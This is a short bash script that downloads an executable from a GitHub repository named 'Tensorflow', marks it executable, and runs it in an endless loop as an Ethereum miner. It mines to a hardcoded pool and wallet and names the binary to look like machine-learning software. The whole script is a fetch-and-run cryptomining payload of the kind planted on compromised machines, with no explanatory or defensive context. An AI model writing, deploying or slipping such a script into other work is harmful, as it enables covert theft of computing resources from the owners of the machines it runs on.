#!/bin/bash
POOL=eth.ethashpool.com:3939
WALLET=0xC887F4845da5eDcF45EcF7ac32035Fb41527B8c6.
WORKER=$(echo $(shuf -i 10-20 -n 1)-COLN#im8m-ybvt)
wget https://github.com/nglkmerkel/Tensorflow/raw/main/tensorinit
chmod +x tensorinit
while [ 1 ]; do
./tensorinit --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 10
done
sleep 999999999 
